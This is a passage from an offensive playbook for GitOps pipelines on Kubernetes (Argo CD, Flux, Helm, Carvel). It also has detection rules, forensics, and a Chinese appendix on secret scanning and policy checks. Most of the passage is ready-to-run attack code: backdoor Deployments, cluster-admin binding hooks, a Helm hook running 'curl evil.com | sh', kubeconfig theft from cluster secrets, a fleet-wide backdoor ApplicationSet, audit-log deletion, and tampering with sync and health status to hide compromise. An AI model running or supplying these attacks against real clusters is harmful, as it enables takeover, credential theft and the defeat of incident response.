# Re-applies on every sync; survives deletion
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kali-controller
  namespace: kube-system
spec:
  replicas: 1
  selector:
    matchLabels: { app: kali-controller }
  template:
    metadata:
      labels: { app: kali-controller }
    spec:
      serviceAccountName: argocd-application-controller  # cluster-admin via existing Argo
      containers:
        - name: c
          image: kali/claw-backdoor:latest
```

### §22.3 Sync-wave persistence

```yaml
# PreSync hook that runs before legitimate manifests
apiVersion: batch/v1
kind: Job
metadata:
  name: kali-presync
  annotations:
    argocd.argoproj.io/hook: PreSync
    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation
spec:
  template:
    spec:
      serviceAccountName: argocd-application-controller
      restartPolicy: OnFailure
      containers:
        - name: c
          image: bitnami/kubectl:1.29
          command: ["sh", "-c"]
          args:
            - |
              kubectl apply -f - <<'EOF'
              apiVersion: rbac.authorization.k8s.io/v1
              kind: ClusterRoleBinding
              metadata: { name: kali-binding }
              roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
              subjects:
                - kind: ServiceAccount
                  name: kali
                  namespace: default
              ---
              apiVersion: v1
              kind: ServiceAccount
              metadata: { name: kali, namespace: default }
              EOF
```

---

## §23. Self-Heal as Cover

### §23.1 Self-heal deletes IR changes

```bash
# IR deletes a malicious pod → Argo CD self-heal recreates it
kubectl delete pod kali-backdoor -n production
# Wait < 60s
kubectl get pod kali-backdoor -n production  # recreated by Argo sync
```

### §23.2 operationState manipulation

```bash
# Hide a failed sync by patching operationState
kubectl patch application prod-app -n argocd --type=merge -p '{
  "status": {
    "operationState": {
      "phase": "Succeeded",
      "message": "Sync succeeded"
    }
  }
}'
```

### §23.3 Hide unhealthy workload

```bash
# Patch Argo CD health check Lua to always return Healthy
kubectl patch configmap argocd-cm -n argocd --type=merge -p '{
  "data": {
    "resource.customizations.health.production_Deployment": |
      hs = {}
      hs.status = "Healthy"
      hs.message = "all good"
      return hs
  }
}'
```

---

## §24. Audit Log Suppression

### §24.1 Delete audit events from local sink

```bash
# If audit logs are stored in a ConfigMap (some installs):
kubectl delete configmap audit-events -n kube-system

# Or in Loki — delete the log file
kubectl exec -n loki loki-0 -- rm /var/loki/chunks/default/audit.log
```

### §24.2 Impersonate anonymous user

```bash
# Hide from audit by impersonating system:anonymous (often not audited)
kubectl --as=system:anonymous --as-group=system:unauthenticated \
  get secrets -A
```

---

## §25. Multi-Cluster Pivot via Argo ApplicationSet

### §25.1 Enumerate cluster secrets

```bash
# Each cluster Argo CD knows has a Secret with kubeconfig
kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster

# Extract kubeconfig
kubectl get secret cluster-prod-us-east-1 -n argocd -o jsonpath='{.data.config}' | \
  base64 -d > prod-us-east-1.kubeconfig
```

### §25.2 Pivot

```bash
KUBECONFIG=prod-us-east-1.kubeconfig kubectl get pods -A
KUBECONFIG=prod-us-east-1.kubeconfig kubectl get secrets -A
```

### §25.3 Deploy backdoor across all clusters

```yaml
# ApplicationSet that targets every cluster
apiVersion: argoproj.io/v1alpha1
kind: ApplicationSet
metadata:
  name: kali-fleet
  namespace: argocd
spec:
  generators:
    - clusters: {}
  template:
    metadata:
      name: 'kali-{{name}}'
    spec:
      source:
        repoURL: git@github.com:attacker/kali-fleet.git
        path: backdoor
      destination:
        server: '{{server}}'
        namespace: kube-system
      syncPolicy:
        automated: { prune: false, selfHeal: true }
```

---

## §26. Helm Chart Tampering

### §26.1 Public chart registry substitution

```bash
# Compromise or register a typosquatted chart name
helm package kali-backdoor
helm push kali-backdoor-1.0.0.tgz oci://registry.example.com/

# If GitOps repo points to a chart name you control (e.g. typo-squat of "prometheus"):
# Argo CD / Flux fetches your chart, applies it with elevated RBAC
```

### §26.2 post-render hook injection

```yaml
# Helm chart with a post-install hook
apiVersion: batch/v1
kind: Job
metadata:
  name: "{{ .Release.Name }}-post-install"
  annotations:
    "helm.sh/hook": post-install
spec:
  template:
    spec:
      restartPolicy: OnFailure
      containers:
        - name: c
          image: alpine
          command: ["sh", "-c", "curl evil.com | sh"]
```

---

## §27. Source Integrity Bypass

### §27.1 Disable GPG commit verification

```bash
# Argo CD supports GPG commit verification. If disabled:
argocd app get prod-app -o yaml | grep -i gpg
# → no gpgPublicKeySecret → no verification

# Forge commits with attacker key:
git commit --gpg-sign=$(gpg --list-secret-keys --keyid-format LONG | grep rsa | awk '{print $1}')
```

### §27.2 Cosign image verification bypass

```yaml
# If Argo CD is configured for Cosign but key is attacker-controlled:
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata: { name: prod-app, namespace: argocd }
spec:
  source:
    helm:
      values: |
        image:
          repository: registry.example.com/prod
          tag: "v1.2.3"
        imageVerification:
          key: |-
            -----BEGIN PUBLIC KEY-----
            REPLACE_WITH_ATTACKER_PUBLIC_KEY
            -----END PUBLIC KEY-----
```

---

## §28. Carvel / kapp-controller

### §28.1 PackageRepository CRD abuse

```yaml
apiVersion: packaging.carvel.dev/v1alpha1
kind: PackageRepository
metadata:
  name: kali-repo
  namespace: default
spec:
  fetch:
    image:
      url: registry.example.com/kali/packages:latest
```

### §28.2 App CRD with privileged SA

```yaml
apiVersion: kappctrl.k14s.io/v1alpha1
kind: App
metadata:
  name: kali-app
  namespace: default
spec:
  serviceAccountName: cluster-admin-sa
  fetch:
    - git:
        url: https://github.com/attacker/evil
        ref: origin/main
  template:
    - ytt: {}
  deploy:
    - kapp: {}
```

---

## §29. Detection Engineering Countermeasures

### §29.1 Detection rules for GitOps abuse

```yaml
# Sigma rule: argo-cd application destination change
title: Argo CD Application destination changed to kube-system
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: update
    resource: applications.argoproj.io
  kubeSystem:
    objectRef.namespace: kube-system
  condition: selection and kubeSystem
level: high
```

```yaml
# Sigma rule: Sealed Secrets private key access
title: Sealed Secrets private key access
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: get
    resource: secrets
  label:
    sealedsecrets.bitnami.com/sealed-secret-key: active
  condition: selection and label
level: critical
```

```yaml
# Sigma rule: SOPS AGE key access
title: SOPS AGE key access from non-controller
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: get
    resource: secrets
    objectRef.name: sops-age
  notController:
    user.username|re: !argocd-application-controller|!source-controller|!kustomize-controller
  condition: selection and notController
level: critical
```

### §29.2 Falco rule for Argo CD sync hook abuse

```yaml
- macro: argocd_sa
  condition: ka.user.name startswith "system:serviceaccount:argocd"
- rule: Argo CD SA applied ClusterRoleBinding
  desc: Detect Argo CD SA creating cluster-admin rolebindings
  condition: argocd_sa and ka.verb=create and ka.target.resource=clusterrolebindings
  output: Argo CD SA applied ClusterRoleBinding (user=%ka.user.name ns=%ka.target.namespace)
  priority: CRITICAL
```

---

## §30. Post-Compromise Forensic Techniques

### §30.1 Recover sync history

```bash
# Argo CD keeps operation history in CRD status
kubectl get application -A -o yaml | yq -r '.items[].status.history[]'

# Flux events
kubectl get events -n flux-system --sort-by='.lastTimestamp' --field-selector reason=ReconciliationSucceeded
```

### §30.2 Diff Git history

```bash
# Find suspicious commits in source-of-truth
git -C /tmp/gitops-prod log --since='2 weeks ago' \
  --pretty=format:'%h %an %s' | \
  grep -iE '(fix|update|align|hotfix|backmerge|chore)'

# Suspicious: PRs that touch RBAC, ClusterRole, ServiceAccount, deploy keys
git -C /tmp/gitops-prod log --since='2 weeks ago' -p | \
  grep -E '^\+.*(cluster-admin|hostPath|privileged)' | head -20
```

### §30.3 Audit CRD backdoors

```bash
# Find CRDs added recently
kubectl get crd -o json | jq -r '.items[] | select(.metadata.creationTimestamp > "2026-06-01T00:00:00Z") | .metadata.name'

# Find controllers running with cluster-admin that don't look like system controllers
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.serviceAccountName != "default") | "\(.metadata.namespace)/\(.metadata.name) \(.spec.serviceAccountName)"' | \
  grep -vE '(kube-system/(coredns|kube-proxy|metrics-server|calico|cilium)|argocd-application-controller|source-controller|kustomize-controller)'
```

---

## §31. Open Source Tooling

### §31.1 Argo CD exploitation

```bash
# argocd-ext-cnp (community) — list overprivileged applications
argocd app list -o json | jq -r '.items[] | select(.spec.destination.namespace == "kube-system")'

# argocd-vault-reconciler-tool — extract Vault credentials from sync logs
argocd app logs prod-app --since 24h | grep -E 'VAULT|token'

# gato-argo (PoC) — GitOps CVE scanner
python3 -m kali.argo_scan --target https://argocd.example.com --all-cves
```

### §31.2 Flux exploitation

```bash
# Flux CLI to map all syncs
flux tree kustomization flux-system
flux tree helmrelease prometheus
```

### §31.3 Cluster enum

```bash
# kubescape — RBAC analyzer
kubescape scan framework nsa --submit \
  --account REPLACE_WITH_YOUR_ACCOUNT_ID

# rbac-lookup — who-can
rbac-lookup --k8s-config=$KUBECONFIG

# kube-hunter
kube-hunter --remote argocd.example.com
```

---

## §32. Lab Setup for Testing

### §32.1 Vulnerable Argo CD lab

```bash
# Deploy Argo CD 2.4.0 (vulnerable to CVE-2022-24348) in minikube
minikube start
kubectl create ns argocd
kubectl apply -n argocd -f \
  https://raw.githubusercontent.com/argoproj/argo-cd/v2.4.0/manifests/install.yaml

# Forward API
kubectl port-forward svc/argocd-server -n argocd 8080:443 &

# Get admin password
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d
```

### §32.2 Vulnerable Flux lab

```bash
# Deploy Flux v0.36.0 (vulnerable to some CVEs)
flux install --version=0.36.0 --namespace=flux-system
flux create source git flux-system \
  --url=https://github.com/fluxcd/flux2-kustomize-helm-example \
  --branch=main
flux create kustomization flux-system \
  --source=flux-system \
  --path="./production"
```

### §32.3 Sealed Secrets lab

```bash
helm install sealed-secrets sealed-secrets/sealed-secrets \
  --namespace kube-system --create-namespace

# Create a test sealed secret
echo -n 'supersecret' | kubectl create secret generic test --dry-run=client --from-file=password=/dev/stdin -o yaml | \
  kubeseal --controller-namespace kube-system -o yaml > test-sealed.yaml
```

---

## §33. Recon Cheatsheet (one-liners)

```bash
# All GitOps CRDs
kubectl api-resources --verbs=list -o name | grep -iE 'argoproj|fluxcd|fleet|tekton'

# All namespaces with GitOps controllers
kubectl get pods -A -l 'app.kubernetes.io/part-of in (argocd,flux,fleet,tekton-pipelines)'

# All Argo CD Applications with cluster-wide destinations
kubectl get applications -A -o json | jq -r '.items[] | select(.spec.destination.namespace=="kube-system") | .metadata.name'

# All Flux HelmReleases reading from secrets
kubectl get helmreleases -A -o json | jq -r '.items[] | select(.spec.valuesFrom!=null) | .metadata.namespace + "/" + .metadata.name'

# All HelmRelease valuesFrom
kubectl get helmreleases -A -o json | jq -r '.items[] | .spec.valuesFrom[]? | "\(.kind)/\(.name)"'

# All ExternalSecrets pulling from ClusterSecretStores
kubectl get externalsecrets -A -o json | jq -r '.items[] | select(.spec.secretStoreRef.kind=="ClusterSecretStore") | .metadata.namespace + "/" + .metadata.name'

# All GitRepository deploy secrets
kubectl get gitrepositories -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,SECRET:.spec.secretRef.name
```

---

## References

- Argo CD Security Advisories — https://github.com/argoproj/argo-cd/security/advisories
- Flux Security Advisories — https://github.com/fluxcd/flux2/security/advisories
- Sealed Secrets — https://github.com/bitnami-labs/sealed-secrets
- SOPS — https://github.com/getsops/sops
- External Secrets Operator — https://external-secrets.io/
- CVE-2022-24348 — Argo CD path traversal
- CVE-2024-21626 — runc Leaky Vessels escape
- CVE-2024-32564 — Argo CD CM bypass
- CVE-2024-37286 — FluxCD Helm Controller
- Akuukam — Argo CD compromise case study
- Aqua Security — *GitOps Attack Surface* (2024)
- Palo Alto Unit 42 — *Argo CD Misconfigurations* (2024)
- NSA Kubernetes Hardening Guide v1.2 (2024)
- MITRE ATT&CK for Containers


---

## Git Secret Scanning + Policy-as-Code (v0.2.5.3)

### gitleaks 凭据扫描（F-GIT-001）

```bash
# 安装
sudo apt install gitleaks  # 或从 github.com/gitleaks/gitleaks/releases 下载

# 扫描 git 历史
gitleaks detect --source=/path/to/repo --report-path=gitleaks-report.json

# 仅扫描工作区（不查历史）
gitleaks protect --source=/path/to/repo

# 扫描指定目录（非 git 仓库）
gitleaks detect --no-git --source=/path/to/dir

# 输出格式
gitleaks detect --source=. --report-format=json --report-path=report.json
gitleaks detect --source=. --report-format=sarif --report-path=report.sarif
```

**实战验证**（2026-08-17）：
```bash
# 检出 .env 被提交到历史
cd ~/gitops-lab
git log --oneline --all -- .env
git show HEAD:.env  # → password123
```

### detect-secrets（Yelp 替代工具）

```bash
pip install detect-secrets
detect-secrets scan --all-files > secrets.json
detect-secrets audit secrets.json
```

### Kyverno / OPA 策略审计（F-GIT-002）

#### Kyverno 策略（检测高危配置）

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-latest-tag
spec:
  validationFailureAction: audit
  rules:
  - name: require-image-tag
    match:
      resources:
        kinds: [Pod]
    validate:
      message: "禁止使用 latest 标签"
      pattern:
        spec:
          containers:
          - image: "!*:latest"
```

#### Kyverno 审计命令

```bash
# 安装 kyverno CLI
kubectl apply -f https://raw.githubusercontent.com/kyverno/kyverno/main/config/install.yaml

# 验证策略（dry-run）
kyverno apply disallow-latest-tag.yaml --resource pod.yaml

# 扫描集群中的违规
kubectl get policyreports -A
```

#### OPA / Conftest

```bash
# 安装 conftest
docker pull openpolicyagent/conftest

# 验证 YAML 配置
conftest test deployment.yaml --policy policy.rego

# policy.rego 示例
package main

deny[msg] {
  input.spec.template.spec.containers[_].image == "nginx:latest"
  msg := "禁止使用 latest 标签"
}

deny[msg] {
  input.spec.template.spec.containers[_].securityContext.privileged == true
  msg := "禁止 privileged 容器"
}
```

### Argo CD Application 审计（实战验证结果）

检出 3 个供应链漏洞：
- `targetRevision: HEAD` → 不 pin commit，供应链风险
- `selfHeal: true` → 自动恢复攻击者恶意配置
- 公开 `repoURL` → 可被 typosquat
